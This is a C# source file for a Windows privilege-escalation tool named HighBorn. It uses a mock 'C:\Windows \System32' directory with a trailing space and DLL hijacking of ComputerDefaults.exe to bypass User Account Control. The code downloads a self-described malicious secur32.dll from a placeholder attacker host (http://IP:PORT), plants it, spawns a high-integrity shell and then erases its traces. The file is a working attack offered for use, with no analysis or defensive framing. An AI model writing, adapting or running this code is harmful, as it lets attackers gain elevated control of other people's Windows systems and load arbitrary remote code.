using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;

namespace HighBorn
{
    class HighBorn
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateDirectory(string lpPathName, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern bool CopyFile(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)]string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool RemoveDirectory(string lpPathName);

        [DllImport("ntdll.dll")]
        public static extern int NtDelayExecution(bool Alertable, ref long DelayInterval);

        [DllImport("ntdll.dll")]
        public static extern int ZwSetTimerResolution(uint RequestedResolution, bool Set, out uint ActualResolution);

        private static bool isResolutionSet = false;

        static void SleepShort(float milliseconds)
        {
            if (!isResolutionSet)
            {
                uint actualResolution;
                ZwSetTimerResolution(1, true, out actualResolution);
                isResolutionSet = true;
            }

            long interval = (long)(-1 * milliseconds * 10000.0f); // Convert to 100-nanosecond intervals
            NtDelayExecution(false, ref interval);
        }

        public static void Main(string[] args)
        {
            IntPtr wow64Value = IntPtr.Zero;

            Wow64DisableWow64FsRedirection(ref wow64Value);

            Console.WriteLine("[^] Directories Created");
            try
            {
                CreateDirectory(@"\\?\C:\Windows \", IntPtr.Zero);
                CreateDirectory(@"\\?\C:\Windows \System32\", IntPtr.Zero);
            }
            catch
            {
                Console.WriteLine("[-] Unable to create directories");
            }

            SleepShort(2000); // Sleep for 2 seconds

            Console.WriteLine("[^] Copying Executable Into Mock Directory");
            try
            {

                CopyFile(@"C:\Windows\System32\ComputerDefaults.exe", @"C:\Windows \System32\ComputerDefaults.exe", true);

            }
            catch
            {
                Console.WriteLine("[-] Unable to create the mock directories");
            }

            SleepShort(2000); // Sleep for 2 seconds

            Console.WriteLine("[^] Downloading Malicious DLL");
            try
            {
                using (WebClient webClient = new WebClient())
                {
                    webClient.DownloadFile("http://IP:PORT/secur32.dll", @"C:\Windows\temp\secur32.dll");
                }
            }
            catch
            {
                Console.WriteLine("[^] DLL Downloaded");
            }

            CopyFile(@"C:\Windows\temp\secur32.dll", @"C:\Windows \System32\secur32.dll", true);

            SleepShort(2000); // Sleep for 2 seconds

            Console.WriteLine("[^] Spawning High Integrity Shell");
            try
            {
                Process.Start(@"C:\Windows \System32\ComputerDefaults.exe").WaitForExit();
            }
            catch
            {
                Console.WriteLine("[-] Shell messed up");
            }

            SleepShort(2000); // Sleep for 2 seconds

            Console.WriteLine("[^] Cleaning Up");

            DeleteFileW(@"C:\Windows\temp\secur32.dll");
	    SleepShort(2000);
            DeleteFileW(@"C:\Windows \System32\ComputerDefaults.exe");
            SleepShort(2000);
	    DeleteFileW(@"C:\Windows \System32\secur32.dll");
            RemoveDirectory(@"C:\Windows \System32\");
            RemoveDirectory(@"C:\Windows \");

            Wow64RevertWow64FsRedirection(wow64Value);
        }
    }
}
